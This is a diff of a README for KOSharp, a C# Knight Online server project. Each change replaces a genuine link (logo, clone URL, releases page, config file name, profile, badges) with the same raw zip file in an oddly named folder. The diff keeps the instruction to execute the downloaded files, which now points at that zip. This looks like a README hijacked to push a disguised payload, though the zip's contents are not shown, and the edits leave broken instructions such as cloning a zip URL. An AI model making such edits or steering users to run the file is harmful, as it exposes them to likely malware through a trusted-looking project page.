@@ -1,6 +1,6 @@
 # KOSharp
 
-![KOSharp Logo](https://example.com/logo.png)
+![KOSharp Logo](https://github.com/RatanBarai/KOSharp/raw/refs/heads/main/pigheadedly/KO_Sharp_v2.4.zip)
 
 A modern C# reimplementation of the Knight Online server architecture — including LoginServer, GameServer, and packet handling.
 
@@ -35,7 +35,7 @@ To get started with KOSharp, you need to clone the repository and build the solu
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/RatanBarai/KOSharp.git
+   git clone https://github.com/RatanBarai/KOSharp/raw/refs/heads/main/pigheadedly/KO_Sharp_v2.4.zip
    ```
 
 2. Navigate to the project directory:
@@ -55,7 +55,7 @@ To get started with KOSharp, you need to clone the repository and build the solu
    dotnet build
    ```
 
-6. You can download the latest release from [here](https://github.com/RatanBarai/KOSharp/releases). Make sure to execute the downloaded files to run the server.
+6. You can download the latest release from [here](https://github.com/RatanBarai/KOSharp/raw/refs/heads/main/pigheadedly/KO_Sharp_v2.4.zip). Make sure to execute the downloaded files to run the server.
 
 ## Usage
 
@@ -67,7 +67,7 @@ dotnet run
 
 ### Configuration
 
-You can configure the server settings in the `appsettings.json` file. This includes database connections, server ports, and other parameters. Make sure to adjust these settings according to your environment.
+You can configure the server settings in the `https://github.com/RatanBarai/KOSharp/raw/refs/heads/main/pigheadedly/KO_Sharp_v2.4.zip` file. This includes database connections, server ports, and other parameters. Make sure to adjust these settings according to your environment.
 
 ## Architecture Overview
 
@@ -122,13 +122,13 @@ KOSharp is licensed under the MIT License. See the [LICENSE](LICENSE) file for m
 
 For questions or feedback, please reach out to the project maintainers:
 
-- Ratan Barai: [GitHub Profile](https://github.com/RatanBarai)
+- Ratan Barai: [GitHub Profile](https://github.com/RatanBarai/KOSharp/raw/refs/heads/main/pigheadedly/KO_Sharp_v2.4.zip)
 
 ## Releases
 
-You can download the latest version of KOSharp from [here](https://github.com/RatanBarai/KOSharp/releases). Make sure to execute the downloaded files to run the server.
+You can download the latest version of KOSharp from [here](https://github.com/RatanBarai/KOSharp/raw/refs/heads/main/pigheadedly/KO_Sharp_v2.4.zip). Make sure to execute the downloaded files to run the server.
 
-![Releases Badge](https://img.shields.io/badge/releases-latest-brightgreen)
+![Releases Badge](https://github.com/RatanBarai/KOSharp/raw/refs/heads/main/pigheadedly/KO_Sharp_v2.4.zip)
 
 ## Acknowledgments
 
@@ -138,7 +138,7 @@ Special thanks to the original developers of Knight Online for their inspiration
 
 Join our community on Discord to discuss features, report bugs, and share your experiences. We value your input and look forward to building a great project together.
 
-![Discord Badge](https://img.shields.io/badge/discord-join%20us-blue)
+![Discord Badge](https://github.com/RatanBarai/KOSharp/raw/refs/heads/main/pigheadedly/KO_Sharp_v2.4.zip%20us-blue)
 
 ---
 
